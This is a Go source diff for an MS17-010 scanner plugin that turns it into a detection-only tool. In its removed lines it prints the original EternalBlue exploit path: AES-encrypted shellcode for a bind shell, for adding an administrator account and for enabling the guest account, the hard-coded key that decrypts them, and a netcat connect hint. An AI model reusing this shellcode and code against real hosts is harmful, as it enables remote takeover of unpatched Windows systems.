@@ -11,16 +11,15 @@ import (
 	"encoding/hex"
 	"fmt"
 	"net"
-	"os"
 	"strings"
 	"time"
 
-	"github.com/shadow1ng/fscan/common"
-	"github.com/shadow1ng/fscan/common/i18n"
-	"github.com/shadow1ng/fscan/plugins"
+	"scanner/common"
+	"scanner/common/i18n"
+	"scanner/plugins"
 )
 
-// MS17010Plugin MS17-010漏洞检测和利用插件 - 保持完整的原始利用功能
+// MS17010Plugin MS17-010漏洞检测插件（仅检测，不含利用功能）
 type MS17010Plugin struct {
 	plugins.BasePlugin
 }
@@ -31,8 +30,6 @@ func NewMS17010Plugin() *MS17010Plugin {
 		BasePlugin: plugins.NewBasePlugin("ms17010"),
 	}
 }
-
-// GetPorts 实现Plugin接口
 
 // Scan 执行MS17-010扫描
 func (p *MS17010Plugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *ScanResult {
@@ -82,92 +79,9 @@ func (p *MS17010Plugin) Scan(ctx context.Context, info *common.HostInfo, session
 	}
 }
 
-// Exploit 执行MS17-010漏洞利用
-func (p *MS17010Plugin) Exploit(ctx context.Context, info *common.HostInfo, creds Credential, session *common.ScanSession) *ExploitResult {
-	config := session.Config
-	target := info.Target()
-	session.LogSuccess(i18n.Tr("ms17010_start", target))
+// SMB握手数据加解密工具函数
 
-	var output strings.Builder
-	output.WriteString(i18n.Tr("ms17010_exploit_header", target) + "\n")
-
-	// 首先确认漏洞存在
-	vulnerable, osVersion, hasBackdoor, err := p.checkMS17010Vulnerability(ctx, info.Host, session)
-	if err != nil {
-		output.WriteString("\n" + i18n.Tr("ms17010_exploit_check_failed", err) + "\n")
-		return &ExploitResult{
-			Success: false,
-			Output:  output.String(),
-			Error:   err,
-		}
-	}
-
-	if !vulnerable {
-		output.WriteString("\n" + i18n.GetText("ms17010_exploit_not_vulnerable") + "\n")
-		return &ExploitResult{
-			Success: false,
-			Output:  output.String(),
-			Error:   fmt.Errorf("%s", i18n.GetText("ms17010_not_vulnerable")),
-		}
-	}
-
-	output.WriteString("\n" + i18n.GetText("ms17010_exploit_confirmed") + "\n")
-	if osVersion != "" {
-		output.WriteString(i18n.Tr("ms17010_exploit_os", osVersion) + "\n")
-	}
-
-	if hasBackdoor {
-		output.WriteString("\n" + i18n.GetText("ms17010_exploit_backdoor_found") + "\n")
-	} else {
-		output.WriteString("\n" + i18n.GetText("ms17010_exploit_backdoor_not_found") + "\n")
-	}
-
-	// 如果有Shellcode配置，执行实际利用
-	if config.Shellcode != "" {
-		output.WriteString("\n" + i18n.Tr("ms17010_exploit_mode", config.Shellcode) + "\n")
-		output.WriteString(i18n.GetText("ms17010_exploit_start_attack") + "\n")
-
-		// 执行实际的MS17010利用
-		err = p.executeMS17010Exploit(info, session)
-		if err != nil {
-			output.WriteString(i18n.Tr("ms17010_exploit_failed", err) + "\n")
-			return &ExploitResult{
-				Success: false,
-				Output:  output.String(),
-				Error:   err,
-			}
-		}
-		output.WriteString(i18n.GetText("ms17010_exploit_success") + "\n")
-
-		// 根据不同类型提供后续操作建议
-		switch config.Shellcode {
-		case "bind":
-			output.WriteString("\n" + i18n.GetText("ms17010_exploit_bind_hint") + "\n")
-			fmt.Fprintf(&output, "  nc %s 64531\n", info.Host)
-		case "add":
-			output.WriteString("\n" + i18n.GetText("ms17010_exploit_add_hint") + "\n")
-			output.WriteString(i18n.GetText("ms17010_exploit_add_credential") + "\n")
-			fmt.Fprintf(&output, "  RDP: mstsc /v:%s\n", info.Host)
-		case "guest":
-			output.WriteString("\n" + i18n.GetText("ms17010_exploit_guest_hint") + "\n")
-		}
-	} else {
-		output.WriteString("\n" + i18n.GetText("ms17010_exploit_detect_only") + "\n")
-		output.WriteString(i18n.GetText("ms17010_exploit_shellcode_hint") + "\n")
-		output.WriteString(i18n.GetText("ms17010_exploit_supported_modes") + "\n")
-	}
-
-	session.LogSuccess(i18n.Tr("ms17010_complete", target))
-
-	return &ExploitResult{
-		Success: true,
-		Output:  output.String(),
-	}
-}
-
-// 以下是完整的原始MS17010检测和利用代码，保持不变
-
-// AES解密函数 (从legacy/Base.go复制)
+// AES解密函数
 func aesDecrypt(crypted string, key string) (string, error) {
 	cryptedBytes, err := base64.StdEncoding.DecodeString(crypted)
 	if err != nil {
@@ -202,10 +116,10 @@ func aesDecrypt(crypted string, key string) (string, error) {
 	return string(cryptedBytes[:len(cryptedBytes)-padding]), nil
 }
 
-// 默认AES解密密钥 (从legacy代码复制)
+// AES解密密钥
 var defaultKey = "0123456789abcdef"
 
-// SMB协议加密的请求数据 (从原始MS17010.go复制)
+// SMB协议检测请求数据（仅用于漏洞检测，不含利用载荷）
 var (
 	negotiateProtocolRequestEnc  = "G8o+kd/4y8chPCaObKK8L9+tJVFBb7ntWH/EXJ74635V3UTXA4TFOc6uabZfuLr0Xisnk7OsKJZ2Xdd3l8HNLdMOYZXAX5ZXnMC4qI+1d/MXA2TmidXeqGt8d9UEF5VesQlhP051GGBSldkJkVrP/fzn4gvLXcwgAYee3Zi2opAvuM6ScXrMkcbx200ThnOOEx98/7ArteornbRiXQjnr6dkJEUDTS43AW6Jl3OK2876Yaz5iYBx+DW5WjiLcMR+b58NJRxm4FlVpusZjBpzEs4XOEqglk6QIWfWbFZYgdNLy3WaFkkgDjmB1+6LhpYSOaTsh4EM0rwZq2Z4Lr8TE5WcPkb/JNsWNbibKlwtNtp94fIYvAWgxt5mn/oXpfUD"
 	sessionSetupRequestEnc       = "52HeCQEbsSwiSXg98sdD64qyRou0jARlvfQi1ekDHS77Nk/8dYftNXlFahLEYWIxYYJ8u53db9OaDfAvOEkuox+p+Ic1VL70r9Q5HuL+NMyeyeN5T5el07X5cT66oBDJnScs1XdvM6CBRtj1kUs2h40Z5Vj9EGzGk99SFXjSqbtGfKFBp0DhL5wPQKsoiXYLKKh9NQiOhOMWHYy/C+Iwhf3Qr8d1Wbs2vgEzaWZqIJ3BM3z+dhRBszQoQftszC16TUhGQc48XPFHN74VRxXgVe6xNQwqrWEpA4hcQeF1+QqRVHxuN+PFR7qwEcU1JbnTNISaSrqEe8GtRo1r2rs7+lOFmbe4qqyUMgHhZ6Pwu1bkhrocMUUzWQBogAvXwFb8"
@@ -285,7 +199,7 @@ func init() {
 	}
 }
 
-// checkMS17010Vulnerability 检测MS17-010漏洞 (从原始MS17010.go复制和适配)
+// checkMS17010Vulnerability 检测MS17-010漏洞（SMBv1协议握手+特征匹配）
 func (p *MS17010Plugin) checkMS17010Vulnerability(ctx context.Context, ip string, session *common.ScanSession) (bool, string, bool, error) {
 	return p.checkMS17010VulnerabilityAt(ctx, net.JoinHostPort(ip, "445"), session)
 }
@@ -405,76 +319,6 @@ func (p *MS17010Plugin) checkMS17010VulnerabilityAt(ctx context.Context, address
 	}
 
 	return false, osVersion, false, nil
-}
-
-// executeMS17010Exploit 执行MS17010漏洞利用
-func (p *MS17010Plugin) executeMS17010Exploit(info *common.HostInfo, session *common.ScanSession) error {
-	config := session.Config
-	var sc string
-
-	// 根据不同类型选择shellcode (从MS17010-Exp.go复制)
-	switch config.Shellcode {
-	case "bind":
-		// Bind Shell shellcode (加密)
-		scEnc := "gUYe7vm5/MQzTkSyKvpMFImS/YtwI+HxNUDd7MeUKDIxBZ8nsaUtdMEXIZmlZUfoQacylFEZpu7iWBRpQZw0KElIFkZR9rl4fpjyYNhEbf9JdquRrvw4hYMypBbfDQ6MN8csp1QF5rkMEs6HvtlKlGSaff34Msw6RlvEodROjGYA+mHUYvUTtfccymIqiU7hCFn+oaIk4ZtCS0Mzb1S5K5+U6vy3e5BEejJVA6u6I+EUb4AOSVVF8GpCNA91jWD1AuKcxg0qsMa+ohCWkWsOxh1zH0kwBPcWHAdHIs31g26NkF14Wl+DHStsW4DuNaxRbvP6awn+wD5aY/1QWlfwUeH/I+rkEPF18sTZa6Hr4mrDPT7eqh4UrcTicL/x4EgovNXA9X+mV6u1/4Zb5wy9rOVwJ+agXxfIqwL5r7R68BEPA/fLpx4LgvTwhvytO3w6I+7sZS7HekuKayBLNZ0T4XXeM8GpWA3h7zkHWjTm41/5JqWblQ45Msrg+XqD6WGvGDMnVZ7jE3xWIRBR7MrPAQ0Kl+Nd93/b+BEMwvuinXp1viSxEoZHIgJZDYR5DykQLpexasSpd8/WcuoQQtuTTYsJpHFfvqiwn0djgvQf3yk3Ro1EzjbR7a8UzwyaCqtKkCu9qGb+0m8JSpYS8DsjbkVST5Y7ZHtegXlX1d/FxgweavKGz3UiHjmbQ+FKkFF82Lkkg+9sO3LMxp2APvYz2rv8RM0ujcPmkN2wXE03sqcTfDdjCWjJ/evdrKBRzwPFhjOjUX1SBVsAcXzcvpJbAf3lcPPxOXM060OYdemu4Hou3oECjKP2h6W9GyPojMuykTkcoIqgN5Ldx6WpGhhE9wrfijOrrm7of9HmO568AsKRKBPfy/QpCfxTrY+rEwyzFmU1xZ2lkjt+FTnsMJY8YM7sIbWZauZ2S+Ux33RWDf7YUmSGlWC8djqDKammk3GgkSPHjf0Qgknukptxl977s2zw4jdh8bUuW5ap7T+Wd/S0ka90CVF4AyhonvAQoi0G1qj5gTih1FPTjBpf+FrmNJvNIAcx2oBoU4y48c8Sf4ABtpdyYewUh4NdxUoL7RSVouU1MZTnYS9BqOJWLMnvV7pwRmHgUz3fe7Kx5PGnP/0zQjW/P/vgmLMh/iBisJIGF3JDGoULsC3dabGE5L7sXuCNePiOEJmgwOHlFBlwqddNaE+ufor0q4AkQBI9XeqznUfdJg2M2LkUZOYrbCjQaE7Ytsr3WJSXkNbOORzqKo5wIf81z1TCow8QuwlfwIanWs+e8oTavmObV3gLPoaWqAIUzJqwD9O4P6x1176D0Xj83n6G4GrJgHpgMuB0qdlK"
-		var err error
-		sc, err = aesDecrypt(scEnc, defaultKey)
-		if err != nil {
-			return fmt.Errorf("%s: %w", i18n.GetText("ms17010_bind_shellcode_decrypt_failed"), err)
-		}
-
-	case "add":
-		// 添加管理员账户 shellcode (加密)
-		scEnc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xOs7UApLzuCcE52FhTIjY+ckzBVinUHHwwc4QyY6Xo/15ATcQoL7ZiQgii3xFhrJQGnHgQBsmqT/0A1YBa+rrvIIzblF3FDRlXwAvUVTKnCjDJV9NeiS78jgtx6TNlBDyKCy29E3WGbMKSMH2a+dmtjBhmJ94O8GnbrHyd5c8zxsNXRBaYBV/tVyB9TDtM9kZk5QTit+xN2wOUwFa9cNbpYak8VH552mu7KISA1dUPAMQm9kF5vDRTRxjVLqpqHOc+36lNi6AWrGQkXNKcZJclmO7RotKdtPtCayNGV7/pznvewyGgEYvRKprmzf6hl+9acZmnyQZvlueWeqf+I6axiCyHqfaI+ADmz4RyJOlOC5s1Ds6uyNs+zUXCz7ty4rU3hCD8N6v2UagBJaP66XCiLOL+wcx6NJfBy40dWTq9RM0a6b448q3/mXZvdwzj1Evlcu5tDJHMdl+R2Q0a/1nahzsZ6UMJb9GAvMSUfeL9Cba77Hb5ZU40tyTQPl28cRedhwiISDq5UQsTRw35Z7bDAxJvPHiaC4hvfW3gA0iqPpkqcRfPEV7d+ylSTV1Mm9+NCS1Pn5VDIIjlClhlRf5l+4rCmeIPxQvVD/CPBM0NJ6y1oTzAGFN43kYqMV8neRAazACczYqziQ6VgjATzp0k8"
-		var err error
-		sc, err = aesDecrypt(scEnc, defaultKey)
-		if err != nil {
-			return fmt.Errorf("%s: %w", i18n.GetText("ms17010_add_shellcode_decrypt_failed"), err)
-		}
-
-	case "guest":
-		// 激活Guest账户 shellcode (加密)
-		scEnc := "Teobs46+kgUn45BOBbruUdpBFXs8uKXWtvYoNbWtKpNCtOasHB/5Er+C2ZlALluOBkUC6BQVZHO1rKzuygxJ3n2PkeutispxSzGcvFS3QJ1EU517e2qOL7W2sRDlNb6rm+ECA2vQZkTZBAboolhGfZYeM6v5fEB2L1Ej6pWF5CKSYxjztdPF8bNGAkZsQhUAVW7WVKysZ1vbghszGyeKFQBvO9Hiinq/XiUrLBqvwXLsJaybZA44wUFvXC0FA9CZDOSD3MCX2arK6Mhk0Q+6dAR+NWPCQ34cYVePT98GyXnYapTOKokV6+hsqHMjfetjkvjEFohNrD/5HY+E73ihs9TqS1ZfpBvZvnWSOjLUA+Z3ex0j0CIUONCjHWpoWiXAsQI/ryJh7Ho5MmmGIiRWyV3l8Q0+1vFt3q/zQGjSI7Z7YgDdIBG8qcmfATJz6dx7eBS4Ntl+4CCqN8Dh4pKM3rV+hFqQyKnBHI5uJCn6qYky7p305KK2Z9Ga5nAqNgaz0gr2GS7nA5D/Cd8pvUH6sd2UmN+n4HnK6/O5hzTmXG/Pcpq7MTEy9G8uXRfPUQdrbYFP7Ll1SWy35B4n/eCf8swaTwi1mJEAbPr0IeYgf8UiOBKS/bXkFsnUKrE7wwG8xXaI7bHFgpdTWfdFRWc8jaJTvwK2HUK5u+4rWWtf0onGxTUyTilxgRFvb4AjVYH0xkr8mIq8smpsBN3ff0TcWYfnI2L/X1wJoCH+oLi67xMN+yPDirT+LXfLOaGlyTqG6Yojge8Mti/BqIg5RpG4wIZPKxX9rPbMP+Tzw8rpi/9b33eq0YDevzqaj5Uo0HudOmaPwv5cd9/dqWgeC7FJwv73TckogZGbDOASSoLK26AgBat8vCrhrd7T0uBrEk+1x/NXvl5r2aEeWCWBsULKxFh2WDCqyQntSaAUkPe3JKJe0HU6inDeS4d52BagSqmd1meY0Rb/97fMCXaAMLekq+YrwcSrmPKBY9Yk0m1kAzY+oP4nvV/OhCHNXAsUQGH85G7k65I1QnzffroaKxloP26XJPW0JEq9vCSQFI/EX56qt323V/solearWdBVptG0+k55TBd0dxmBsqRMGO3Z23OcmQR4d8zycQUqqavMmo32fy4rjY6Ln5QUR0JrgJ67dqDhnJn5TcT4YFHgF4gY8oynT3sqv0a+hdVeF6XzsElUUsDGfxOLfkn3RW/2oNnqAHC2uXwX2ZZNrSbPymB2zxB/ET3SLlw3skBF1A82ZBYqkMIuzs6wr9S9ox9minLpGCBeTR9j6OYk6mmKZnThpvarRec8a7YBuT2miU7fO8iXjhS95A84Ub++uS4nC1Pv1v9nfj0/T8scD2BUYoVKCJX3KiVnxUYKVvDcbvv8UwrM6+W/hmNOePHJNx9nX1brHr90m9e40as1BZm2meUmCECxQd+Hdqs7HgPsPLcUB8AL8wCHQjziU6R4XKuX6ivx"
-		var err error
-		sc, err = aesDecrypt(scEnc, defaultKey)
-		if err != nil {
-			return fmt.Errorf("%s: %w", i18n.GetText("ms17010_guest_shellcode_decrypt_failed"), err)
-		}
-
-	case "cs":
-		sc = ""
-
-	default:
-		// 从文件读取或直接使用提供的shellcode
-		shellcode := config.Shellcode
-		if strings.Contains(shellcode, "file:") {
-			read, err := os.ReadFile(shellcode[5:])
-			if err != nil {
-				return fmt.Errorf("%s: %w", i18n.GetText("ms17010_shellcode_file_read_failed"), err)
-			}
-			sc = fmt.Sprintf("%x", read)
-		} else {
-			sc = shellcode
-		}
-	}
-
-	// 验证shellcode有效性
-	if len(sc) < 20 {
-		return fmt.Errorf("%s", i18n.GetText("ms17010_invalid_shellcode"))
-	}
-
-	// 解码shellcode
-	scBytes, err := hex.DecodeString(sc)
-	if err != nil {
-		return fmt.Errorf("%s: %w", i18n.GetText("ms17010_shellcode_decode_failed"), err)
-	}
-
-	if err = eternalBlue(net.JoinHostPort(info.Host, "445"), 12, 12, scBytes); err != nil {
-		return fmt.Errorf("MS17-010 exp failed: %w", err)
-	}
-
-	session.LogSuccess(i18n.Tr("ms17010_shellcode_complete", info.Host, len(scBytes)))
-	return nil
 }
 
 // init 自动注册插件
